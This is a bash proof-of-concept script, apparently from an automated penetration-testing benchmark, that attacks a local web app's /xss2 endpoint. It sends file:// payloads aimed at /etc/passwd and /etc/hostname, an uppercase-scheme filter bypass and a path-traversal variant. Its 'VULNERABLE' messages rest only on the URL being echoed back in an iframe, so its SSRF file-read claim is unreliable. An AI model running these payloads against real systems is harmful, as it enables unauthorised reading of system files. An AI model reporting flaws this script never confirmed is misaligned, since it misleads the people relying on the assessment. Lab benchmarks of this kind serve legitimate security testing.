#!/bin/bash
# POC: Demonstrates SSRF vulnerability in /xss2 endpoint via file:// protocol that allows reading arbitrary files from the server filesystem
# Target: ./repo
# Created: 2025-11-05T17:27:06.126Z
# Session: benchmark-XBEN-047-24-mhm9f6sp

# SSRF via file:// Protocol in /xss2 Endpoint
# This POC demonstrates how the /xss2 endpoint accepts file:// URLs
# in the url parameter, allowing arbitrary file read via SSRF

TARGET_URL="http://localhost:5000"
ENDPOINT="/xss2"

echo "[*] SSRF via file:// Protocol POC"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo ""

# Test 1: Basic file:// URL injection to /etc/passwd
echo "[TEST 1] Attempting to read /etc/passwd via file:// protocol"
echo "[*] Crafting request: ${TARGET_URL}${ENDPOINT}?url=file:///etc/passwd"
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?url=file:///etc/passwd")
echo "[*] Response:"
echo "$RESPONSE"
echo ""

# Check if file:// URL is present in the response (indicating lack of filtering)
if echo "$RESPONSE" | grep -q "file:///etc/passwd"; then
    echo "[+] VULNERABLE: file:// URL passed through without sanitization"
    echo "[+] The iframe src contains: file:///etc/passwd"
else
    echo "[-] File URL not found in response"
fi
echo ""

# Test 2: Attempt to read other sensitive files
echo "[TEST 2] Attempting to read /etc/hostname"
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?url=file:///etc/hostname")
echo "[*] Response:"
echo "$RESPONSE"
echo ""

if echo "$RESPONSE" | grep -q "file:///etc/hostname"; then
    echo "[+] VULNERABLE: /etc/hostname also passed through"
fi
echo ""

# Test 3: Verify that normal HTTP URLs still work (for comparison)
echo "[TEST 3] Testing with normal HTTP URL (control test)"
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?url=http://example.com")
echo "[*] Response:"
echo "$RESPONSE"
echo ""

if echo "$RESPONSE" | grep -q "http://example.com"; then
    echo "[+] HTTP URLs are accepted"
fi
echo ""

# Test 4: Check for filter bypass with various file:// encodings
echo "[TEST 4] Testing filter bypass with different file:// encodings"
echo "[*] Attempting: FILE:///etc/passwd (uppercase)"
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?url=FILE:///etc/passwd")
if echo "$RESPONSE" | grep -qi "file:///etc/passwd\|FILE:///etc/passwd"; then
    echo "[+] VULNERABLE: Case variation bypass detected"
fi
echo ""

# Test 5: Test with path traversal in file:// URL
echo "[TEST 5] Attempting path traversal via file://"
echo "[*] Crafting: file:///../../../etc/passwd"
RESPONSE=$(curl -s "${TARGET_URL}${ENDPOINT}?url=file:///../../../etc/passwd")
echo "[*] Response:"
echo "$RESPONSE"
echo ""

echo "[*] POC Complete"